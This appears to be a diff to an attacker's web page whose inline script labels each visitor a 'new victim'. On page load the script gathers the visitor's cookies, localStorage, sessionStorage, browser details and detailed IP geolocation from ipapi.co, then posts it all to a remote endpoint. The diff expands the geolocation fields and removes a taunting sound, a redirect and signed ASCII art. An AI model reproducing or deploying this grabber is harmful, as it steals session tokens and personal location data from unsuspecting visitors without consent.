@@ -38,22 +38,22 @@ function tryStorage(storage) {
   return JSON.stringify(result);
 }
 
-async function getVisitorIP() {
+async function getIpapiData() {
   try {
     const resp = await fetch('https://ipapi.co/json/');
-    if (!resp.ok) throw new Error("Failed to fetch IP");
-    const data = await resp.json();
-    return data.ip || "Unknown";
+    if (!resp.ok) throw new Error("Failed to fetch IP data");
+    return await resp.json();
   } catch (e) {
-    return "Unknown";
+    return {};
   }
 }
 
 document.addEventListener('DOMContentLoaded', async function() {
-  const ip = await getVisitorIP();
+  const ipapi = await getIpapiData();
+
+  // Structure claire : chaque champ ipapi est inclus séparément
   const data = {
     "🔔 Nouvelle victime !": "",
-    "🛜 IP": ip,
     "🌐 URL": location.href,
     "🍪 Cookie": document.cookie || "No cookies",
     "🧠 User Agent": navigator.userAgent,
@@ -66,18 +66,35 @@ document.addEventListener('DOMContentLoaded', async function() {
     "📂 localStorage": tryStorage(localStorage),
     "📂 sessionStorage": tryStorage(sessionStorage),
     "🧑‍💻 Plateforme": navigator.platform,
+    // Ajout de chaque champ ipapi séparément
+    "🛜 IP": ipapi.ip || "",
+    "🌍 Network": ipapi.network || "",
+    "🌐 Version": ipapi.version || "",
+    "🏙️ City": ipapi.city || "",
+    "🏞️ Region": ipapi.region || "",
+    "🏞️ Region Code": ipapi.region_code || "",
+    "🇨🇵 Country": ipapi.country || "",
+    "🌎 Country Name": ipapi.country_name || "",
+    "🌎 Country Code": ipapi.country_code || "",
+    "🌎 Country ISO3": ipapi.country_code_iso3 || "",
+    "🏛️ Capital": ipapi.country_capital || "",
+    "🌐 TLD": ipapi.country_tld || "",
+    "🌍 Continent Code": ipapi.continent_code || "",
+    "🇪🇺 In EU": ipapi.in_eu || "",
+    "🏤 Postal": ipapi.postal || "",
+    "🗺️ Latitude": ipapi.latitude || "",
+    "🗺️ Longitude": ipapi.longitude || "",
+    "⏰ IP Timezone": ipapi.timezone || "",
+    "⏰ UTC Offset": ipapi.utc_offset || "",
+    "📞 Country Calling Code": ipapi.country_calling_code || "",
+    "💶 Currency": ipapi.currency || "",
+    "💶 Currency Name": ipapi.currency_name || "",
+    "🌐 Languages": ipapi.languages || "",
+    "🌍 Country Area": ipapi.country_area || "",
+    "👥 Country Population": ipapi.country_population || "",
+    "🛰️ ASN": ipapi.asn || "",
+    "🏢 Org": ipapi.org || ""
   };
-
-  let msg = "";
-  for (const key in data) {
-    msg += `*${key}* : ${data[key]}\n`;
-  }
-
-  // Lecture du son
-  const audio = new Audio('https://anonfiles.ch/s/vOzGhsK9Mmb');
-  audio.autoplay = true;
-  audio.volume = 0.5;
-  audio.play().catch(() => {});
 
   // Envoi des données au serveur Vercel
   fetch(ENDPOINT, {
@@ -85,60 +102,6 @@ document.addEventListener('DOMContentLoaded', async function() {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ data })
   })
-  .catch(e => console.error("API send error:", e))
-  .finally(() => {
-    window.location.href = "https://www.dog-watch.com";
-
-    const teddyBearArt = `
-                        __,,,__
-                ,-""-,-"       "-,-""-,
-               /,-' , .-'-.7.-'-. , '-,\\
-               \\(    /  _     _  \\    )/
-                '-,  { (0)   (0) }  ,-'
-                 /    >  .---.  <    \\
-                |/ .-'   \\___/   '-. \\|
-                {, /  ,_       _,  \\ ,}
-                \\ {,    \\     /    ,} /
-                 ',\\.    '---'    ./,'
-             _.-""""""-._     _.-""""""-._
-           .'            \`._.\`            '.
-         _/_               _                \\
-      .'\`   \`\\            | |                \\
-     /        |           | |                 ;
-     |        /           |_|                 |
-     \\  ;'---'    _    ___  _  _  ___         ;
-      '. ;       | |  /   \\| || ||  _|     _ ;
-        \`-\\      | |_ | | || |/ /|  _|   .' \`,
-           \`\\    |___|\\___/ \\__/ |___|  |     \\
-             \\            _ _           \\     |
-         jgs  \`\\         | | |         /\`   _/
-    ,-""-.    .'\`\\       | | |       /'-,-'\` .-""-,
-   /      \`\\. '    \`\\     \\___/     /\`    './\`      \\
-  ;  .--.   \\       '\`           /'       /   .--.  ;
-  | (    \\   |,       '\`       /'        |   /    ) |
-   \\ ;    }             ;\\   /;         \`   {    ; /
-    \`;\   \\         _.-'  \\ /  \`-._         /   /;\`
-      \\ \\__.'   _.-'       Y       \`-._    '.__//
-       '.___,.-'                       \`-.,___.'
-           denz haxor
-  `;
-
-    const pre = document.createElement('pre');
-    pre.textContent = teddyBearArt;
-    pre.style.position = 'fixed';
-    pre.style.bottom = '20px';
-    pre.style.left = '20px';
-    pre.style.backgroundColor = 'rgba(0,0,0,0.85)';
-    pre.style.color = '#ff69b4';
-    pre.style.padding = '15px';
-    pre.style.fontSize = '12px';
-    pre.style.fontFamily = 'monospace';
-    pre.style.borderRadius = '12px';
-    pre.style.zIndex = 999999;
-    pre.style.boxShadow = '0 0 20px #ff69b4';
-
-    document.body.appendChild(pre);
-  });
-});
-</script></body>
+  .catch(e => console.error("API send error:", e));
+});</script></body>
 </html>
